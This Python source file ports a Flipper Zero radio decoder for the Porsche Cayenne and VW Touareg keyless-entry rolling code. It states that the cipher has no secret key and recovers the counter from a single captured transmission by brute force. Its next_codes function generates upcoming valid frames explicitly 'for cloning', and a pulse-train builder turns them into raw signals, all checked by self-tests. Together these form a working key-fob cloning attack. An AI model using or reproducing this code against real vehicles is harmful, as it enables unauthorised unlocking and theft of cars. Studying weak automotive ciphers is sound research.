#!/usr/bin/env python3
r"""pp_porsche.py -- pure-Python port of the Flipper Sub-GHz keyless-entry
decoder for the Porsche Cayenne / VW Touareg / Audi rolling cipher.

Ported bit-exact from two identical firmware sources (cross-checked constant by
constant):
  * lib/subghz/protocols/porsche_cayenne.c              (full decoder+encoder)
  * applications/.../ProtoPirate/.../porsche_touareg.c  (Fox edition, decode-only)

This is a KEYLESS ("security by obscurity") scheme: a 24-bit rotating-register
authenticator that is a PURE function of serial + counter + button, with NO
secret key. Because the authenticator only depends on the counter's low byte
(cnt_lo is fully encoded in the packet, cnt_hi seasons a9b/a9c), a single
capture lets us brute-force cnt_lo 0..255 and recover the transmitted counter.

Cayenne vs Touareg: IDENTICAL. Same te_short/te_long/te_delta (1680/3370/500),
same PC_TE_SYNC=3370, PC_TE_GAP=5930, same ROTATE24, same 4+cnt_lo rotations,
same a9a/a9b/a9c assembly, same pkt[4..7] layout. Not one constant differs; the
Fox file only renames symbols and folds the &-masks inline.

Public API:
  compute_frame(serial, counter, button, frame_type=0b010) -> bytes(8)
  next_codes(serial, counter, button, n=4)                 -> list[bytes(8)]
  class PorscheCayenne(ProtoDecoder)                        -- RAW feed() decoder
  ALL = [PorscheCayenne]
"""
from arke_core import Const, ProtoDecoder, diff, is_short, is_long, MASK64

# ---------------------------------------------------------------------------
# Timing constants (firmware SubGhzBlockConst + #defines) -- shared by both
# Cayenne and Touareg with no difference.
# ---------------------------------------------------------------------------
TE_SHORT = 1680  # bit-0 LOW / bit-1 HIGH
TE_LONG = 3370   # bit-1 LOW / bit-0 HIGH, also the preamble half-period
TE_DELTA = 500
PC_TE_SYNC = 3370   # preamble half-period (equal LOW+HIGH)
PC_TE_GAP = 5930    # inter-burst gap half-period
PC_SYNC_MIN = 15    # minimum sync pulses before trusting the preamble
PC_SYNC_COUNT = 73  # preamble pulse-pair count emitted by the encoder
BIT_COUNT = 64

# Decoder parser steps (mirror the C enum ordering).
ST_RESET, ST_SYNC, ST_GAPHIGH, ST_GAPLOW, ST_DATA = 0, 1, 2, 3, 4

# Frame-type markers used across the 4-frame transmit burst (firmware
# porsche_cayenne_build_upload frame_types[] = {0b010, 0b001, 0b100, 0b100}).
FT_FIRST = 0b010
FT_CONT = 0b001
FT_FINAL = 0b100
FRAME_TYPES = (FT_FIRST, FT_CONT, FT_FINAL, FT_FINAL)


# ---------------------------------------------------------------------------
# The cipher (porsche_cayenne_compute_frame). PURE function of serial/counter/
# button/frame_type. Returns the 8 transmitted bytes pkt[0..7] MSB-first.
#
# Note on ~ semantics: C computes ~cnt_lo on the promoted int (upper bits set),
# but every use is immediately masked to <=8 bits, so masking ~x to a byte first
# (ncnt_lo/ncnt_hi) is exactly equivalent and keeps Python's sign-extension out.
# ---------------------------------------------------------------------------
def _rotate24(rh, rm, rl):
    # 24-bit left circular rotation across (r_h : r_m : r_l):
    #   new r_h bit0 <- old r_m MSB, new r_m bit0 <- old r_l MSB,
    #   new r_l bit0 <- old r_h MSB (wrap).
    ch = (rh >> 7) & 1
    cm = (rm >> 7) & 1
    cl = (rl >> 7) & 1
    rh = ((rh << 1) | cm) & 0xFF
    rm = ((rm << 1) | cl) & 0xFF
    rl = ((rl << 1) | ch) & 0xFF
    return rh, rm, rl


def compute_frame(serial, counter, button, frame_type=FT_FIRST):
    """Compute the 8-byte OOK packet. `counter` is the *pre-increment* value;
    the cipher adds 1 internally (cnt = counter + 1), matching the firmware, so
    the transmitted/recovered counter equals counter + 1."""
    serial24 = serial & 0xFFFFFF
    b0 = (uint8((button & 0x0F) << 4)) | (frame_type & 0x07)
    b1 = (serial24 >> 16) & 0xFF
    b2 = (serial24 >> 8) & 0xFF
    b3 = serial24 & 0xFF

    cnt = (counter + 1) & 0xFFFF
    cnt_lo = cnt & 0xFF
    cnt_hi = (cnt >> 8) & 0xFF
    ncnt_lo = (~cnt_lo) & 0xFF
    ncnt_hi = (~cnt_hi) & 0xFF

    # Seed register: r_h <- serial LSB, r_m <- serial MSB, r_l <- serial mid.
    r_h, r_m, r_l = b3, b1, b2

    for _ in range(4):
        r_h, r_m, r_l = _rotate24(r_h, r_m, r_l)
    for _ in range(cnt_lo):
        r_h, r_m, r_l = _rotate24(r_h, r_m, r_l)

    a9a = r_h ^ b0

    nb9b_p1 = (((ncnt_lo << 2) & 0xFC) ^ r_m) & 0xCC
    nb9b_p2 = (((ncnt_hi << 2) & 0xFC) ^ r_m) & 0x30
    nb9b_p3 = (((ncnt_hi >> 6) & 0x03) ^ r_m) & 0x03
    a9b = nb9b_p1 | nb9b_p2 | nb9b_p3

    nb9c_p1 = (((ncnt_lo >> 2) & 0x3F) ^ r_l) & 0x33
    nb9c_p2 = (((ncnt_hi & 0x03) << 6) ^ r_l) & 0xC0
    nb9c_p3 = (((ncnt_hi >> 2) & 0x3F) ^ r_l) & 0x0C
    a9c = nb9c_p1 | nb9c_p2 | nb9c_p3

    pkt = bytearray(8)
    pkt[0] = b0
    pkt[1] = b1
    pkt[2] = b2
    pkt[3] = b3
    pkt[4] = ((a9a >> 2) & 0x3F) | ((ncnt_lo & 0x03) << 6)
    pkt[5] = (ncnt_lo & 0xC0) | ((a9a & 0x03) << 4) | (a9b & 0x0C) | ((ncnt_lo >> 2) & 0x03)
    pkt[6] = ((a9b & 0x03) << 6) | ((a9c >> 2) & 0x3C) | ((ncnt_lo >> 4) & 0x03)
    pkt[7] = ((a9b >> 4) & 0x0F) | ((a9c & 0x0F) << 4)
    return bytes(pkt)


def uint8(x):
    return x & 0xFF


def next_codes(serial, counter, button, n=4):
    """Return the next `n` valid frames for cloning. Given a recovered
    (transmitted) `counter`, these are the frames whose transmitted counter is
    counter+1 .. counter+n -- exactly the 4-frame burst the firmware encoder
    would send (frame_type cycles First, Cont, Final, Final)."""
    out = []
    for k in range(1, n + 1):
        f = k - 1
        ft = FRAME_TYPES[f] if f < len(FRAME_TYPES) else FT_FINAL
        # transmitted counter = arg + 1; we want counter + k -> arg = counter + f
        out.append(compute_frame(serial, counter + f, button, ft))
    return out


# ---------------------------------------------------------------------------
# RAW pulse decoder -- mirrors subghz_protocol_decoder_porsche_cayenne_feed().
# ---------------------------------------------------------------------------
class PorscheCayenne(ProtoDecoder):
    NAME = "Porsche Cayenne/Touareg"
    CONST = Const(TE_SHORT, TE_LONG, TE_DELTA, BIT_COUNT)

    def __init__(self):
        super().__init__()
        self._reset_state()

    def _reset_state(self):
        self.step = ST_RESET
        self.te_last = 0
        self.sync_count = 0
        self.raw_data = 0
        self.bit_count = 0

    def reset(self):
        super().reset()
        self._reset_state()

    def feed(self, level, duration):
        c = self.CONST
        d = c.te_delta
        step = self.step

        if step == ST_RESET:
            # Wait for a LONG LOW (~PC_TE_SYNC) to begin preamble counting.
            if (not level) and diff(duration, PC_TE_SYNC) < d:
                self.sync_count = 1
                self.step = ST_SYNC

        elif step == ST_SYNC:
            if level:
                if diff(duration, PC_TE_SYNC) < d:
                    pass  # good sync HIGH, keep collecting pairs
                elif self.sync_count >= PC_SYNC_MIN and diff(duration, PC_TE_GAP) < d:
                    self.step = ST_GAPLOW  # this HIGH is the gap HIGH -> absorb gap LOW next
                else:
                    self.step = ST_RESET
            else:
                if diff(duration, PC_TE_SYNC) < d:
                    self.sync_count += 1
                elif self.sync_count >= PC_SYNC_MIN and diff(duration, PC_TE_GAP) < d:
                    self.step = ST_GAPHIGH  # gap LOW -> next is gap HIGH
                else:
                    self.step = ST_RESET

        elif step == ST_GAPHIGH:
            if level and diff(duration, PC_TE_GAP) < d:
                self.raw_data = 0
                self.bit_count = 0
                self.step = ST_DATA
            else:
                self.step = ST_RESET

        elif step == ST_GAPLOW:
            if (not level) and diff(duration, PC_TE_GAP) < d:
                self.raw_data = 0
                self.bit_count = 0
                self.step = ST_DATA
            else:
                self.step = ST_RESET

        elif step == ST_DATA:
            if level:
                # Bit is decided by the HIGH length vs the preceding LOW (te_last):
                #   SHORT LOW + LONG HIGH -> 0 ; LONG LOW + SHORT HIGH -> 1
                if is_short(self.te_last, c) and is_long(duration, c):
                    bit = 0
                elif is_long(self.te_last, c) and is_short(duration, c):
                    bit = 1
                else:
                    self.step = ST_RESET
                    return
                self.raw_data = ((self.raw_data << 1) | bit) & MASK64
                self.bit_count += 1
                if self.bit_count == BIT_COUNT:
                    self._lock()
                    self.step = ST_RESET
            else:
                self.te_last = duration  # remember LOW for the following HIGH

    def _lock(self):
        raw = self.raw_data
        pkt = bytearray(8)
        r = raw
        for i in range(7, -1, -1):
            pkt[i] = r & 0xFF
            r >>= 8

        serial = (pkt[1] << 16) | (pkt[2] << 8) | pkt[3]
        btn = pkt[0] >> 4
        frame_type = pkt[0] & 0x07

        # Recover the counter: brute-force cnt_lo 0..255 (try_cnt 1..256),
        # recompute the frame, match the authenticator bytes pkt[4..7].
        cnt = 0
        for try_cnt in range(1, 257):
            tp = compute_frame(serial, try_cnt - 1, btn, frame_type)
            if tp[4] == pkt[4] and tp[5] == pkt[5] and tp[6] == pkt[6] and tp[7] == pkt[7]:
                cnt = try_cnt
                break

        # Deterministic clone: keyless cipher, so the next press's frame is just
        # compute_frame at the next counter (recovered `cnt` already == ext+1).
        nxt = compute_frame(serial, cnt, btn).hex().upper() if cnt else None
        self.emit({
            "data": raw,
            "serial": serial,
            "btn": btn,
            "btn_name": "0x%X" % btn,
            "cnt": cnt,
            "frame_type": frame_type,
            "crc_ok": cnt != 0,
            "next": nxt,
            "next_cnt": cnt if cnt else None,
        })


ALL = [PorscheCayenne]


# ---------------------------------------------------------------------------
# Helpers to build a RAW pulse train and round-trip through the decoder
# (mirror the firmware encoder's preamble + gap + 64 MSB-first data bits).
# ---------------------------------------------------------------------------
def frame_to_pulses(pkt, sync_count=PC_SYNC_COUNT):
    p = []
    for _ in range(sync_count):
        p.append(-TE_LONG)  # LONG LOW
        p.append(TE_LONG)   # LONG HIGH
    p.append(-PC_TE_GAP)    # GAP LOW
    p.append(PC_TE_GAP)     # GAP HIGH
    for byte in pkt:
        for bit in range(7, -1, -1):
            if (byte >> bit) & 1:
                p.append(-TE_LONG)   # bit 1: LONG LOW + SHORT HIGH
                p.append(TE_SHORT)
            else:
                p.append(-TE_SHORT)  # bit 0: SHORT LOW + LONG HIGH
                p.append(TE_LONG)
    return p


def decode_pulses(pulses):
    dec = PorscheCayenne()
    for v in pulses:
        dec.feed(v > 0, abs(v))
    return dec.results


def decode(pkt):
    """Round-trip convenience: build pulses for one packet, decode, return the
    emitted dict (or None)."""
    res = decode_pulses(frame_to_pulses(pkt))
    return res[0] if res else None


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    passed = 0
    failed = 0

    def check(name, cond):
        global passed, failed
        status = "PASS" if cond else "FAIL"
        if cond:
            passed += 1
        else:
            failed += 1
        print("[%s] %s" % (status, name))
        return cond

    SERIAL = 0xABCDEF
    BUTTON = 0x2

    print("=== compute_frame is a pure function (determinism) ===")
    check("compute_frame deterministic",
          compute_frame(SERIAL, 41, BUTTON) == compute_frame(SERIAL, 41, BUTTON))

    print("\n=== cnt_lo brute-force recovers the transmitted counter ===")
    for counter in [0, 1, 5, 41, 100, 200, 254, 255]:
        ft = FT_FIRST
        pkt = compute_frame(SERIAL, counter, BUTTON, ft)
        recovered = 0
        for try_cnt in range(1, 257):
            tp = compute_frame(SERIAL, try_cnt - 1, BUTTON, ft)
            if tp[4:8] == pkt[4:8]:
                recovered = try_cnt
                break
        expect = counter + 1  # cipher increments internally
        check("counter=%d -> recovered cnt=%d (want %d)" % (counter, recovered, expect),
              recovered == expect)

    print("\n=== decode(compute_frame(...)) round-trips serial/btn/cnt ===")
    for counter in [0, 5, 41, 200, 254]:
        for ft in (FT_FIRST, FT_CONT, FT_FINAL):
            pkt = compute_frame(SERIAL, counter, BUTTON, ft)
            res = decode(pkt)
            ok = (res is not None
                  and res["serial"] == SERIAL
                  and res["btn"] == BUTTON
                  and res["cnt"] == counter + 1
                  and res["frame_type"] == ft
                  and res["crc_ok"])
            got = "None" if res is None else "sn=%06X btn=%X cnt=%d ft=%d crc=%s" % (
                res["serial"], res["btn"], res["cnt"], res["frame_type"], res["crc_ok"])
            check("cnt=%d ft=%d -> %s" % (counter, ft, got), ok)

    print("\n=== next_codes(...) yields the next N clone frames ===")
    base = 100
    codes = next_codes(SERIAL, base, BUTTON, n=4)
    check("next_codes returns 4 frames", len(codes) == 4)
    for k, pkt in enumerate(codes, start=1):
        res = decode(pkt)
        ok = (res is not None
              and res["serial"] == SERIAL
              and res["btn"] == BUTTON
              and res["cnt"] == base + k
              and res["crc_ok"])
        got = "None" if res is None else "cnt=%d ft=%d" % (res["cnt"], res["frame_type"])
        check("clone #%d -> transmitted counter %d (%s)" % (k, base + k, got), ok)

    # next_codes must mirror the firmware encoder burst: frame f uses arg cnt+f
    # with frame_types[f], producing transmitted counters base+1..base+4.
    print("\n=== next_codes mirrors the firmware 4-frame burst ===")
    expect_burst = [compute_frame(SERIAL, base + f, BUTTON, FRAME_TYPES[f]) for f in range(4)]
    check("burst bytes match encoder layout", codes == expect_burst)

    print("\n%d passed, %d failed" % (passed, failed))
    raise SystemExit(1 if failed else 0)
